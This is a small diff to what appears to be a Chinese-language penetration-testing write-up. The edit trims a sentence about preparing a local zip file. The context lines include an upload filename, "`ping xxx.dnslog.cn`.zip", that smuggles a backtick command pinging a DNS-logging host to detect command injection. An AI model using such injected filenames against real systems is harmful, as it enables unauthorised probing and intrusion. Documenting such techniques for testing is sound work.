@@ -249,7 +249,7 @@ Content-Type: application/zip
 
 "`ping xxx.dnslog.cn`.zip"
 
-我们可以用本地的压缩包，要特别注意写法
+我们可以用本地的压缩包
 
 那么本地就准备一个zip
 
